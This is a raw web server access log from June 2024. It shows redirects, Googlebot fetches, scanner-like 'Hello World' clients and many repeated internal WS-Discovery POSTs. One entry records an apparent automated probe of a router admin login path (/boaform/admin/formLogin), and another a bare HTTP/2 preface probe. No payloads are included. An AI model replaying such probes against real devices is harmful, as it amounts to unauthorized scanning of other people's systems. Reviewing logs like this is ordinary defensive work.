109.205.213.198 - - [15/Jun/2024:16:13:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
66.249.79.74 - - [15/Jun/2024:16:20:27 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.75 - - [15/Jun/2024:16:20:37 +0000] "GET /ads.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
149.50.103.48 - - [15/Jun/2024:16:22:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
65.154.226.166 - - [15/Jun/2024:16:23:03 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
199.45.154.71 - - [15/Jun/2024:16:34:47 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.154.71 - - [15/Jun/2024:16:34:59 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
45.128.232.194 - - [15/Jun/2024:16:38:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.128.232.194 - - [15/Jun/2024:16:38:06 +0000] "" 400 0 "-" "-"
149.50.103.48 - - [15/Jun/2024:16:39:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
203.83.11.193 - - [15/Jun/2024:16:42:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
192.168.0.101 - - [15/Jun/2024:16:44:15 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [15/Jun/2024:16:44:16 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
